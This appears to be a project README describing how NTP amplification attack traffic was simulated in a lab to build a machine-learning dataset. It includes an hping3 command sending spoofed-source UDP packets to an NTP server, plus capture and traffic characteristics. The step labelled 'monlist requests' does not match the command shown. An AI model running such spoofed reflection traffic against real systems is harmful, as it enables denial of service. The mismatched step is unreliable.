# NTP Amplification Attack — Simulation Steps

This document describes how the NTP amplification traffic used in this project was generated, captured, and processed.

---

## 1. Objective
To simulate a real-world NTP amplification attack and capture the resulting network traffic for machine learning analysis.

---

## 2. Environment Setup
- **Attacker VM:** Kali Linux  
- **Victim VM:** Ubuntu Server  
- **Network:** VirtualBox Host-Only Network  
- **Tools Used:**  
  - `ntpdate`  
  - `hping3`  
  - Wireshark / tcpdump  

---

## 3. Steps Performed

### **Step 1 — Identify NTP Servers**
```bash
ntpdate -q pool.ntp.org
Step 2 — Send spoofed NTP monlist requests
bash
hping3 --udp -p 123 --spoof <victim-ip> <ntp-server-ip> --data 48
Step 3 — Capture traffic on victim
bash
sudo tcpdump -i eth0 udp port 123 -w ntp_attack.pcap
Step 4 — Extract flow features
Using CICFlowMeter or custom Python scripts.
```

## 4. Observed Characteristics
Source port: 123 (NTP)

Amplification ratio: 3x–5x

Packet sizes: 200–500 bytes

Burst traffic pattern typical of reflection attacks

## 5. Output Files
sample_logs.txt — extracted flow summary

ntp_attack.pcap — (not included in repo)

## 6. Notes
This simulation is safe and performed in an isolated lab environment.
No external systems were targeted.

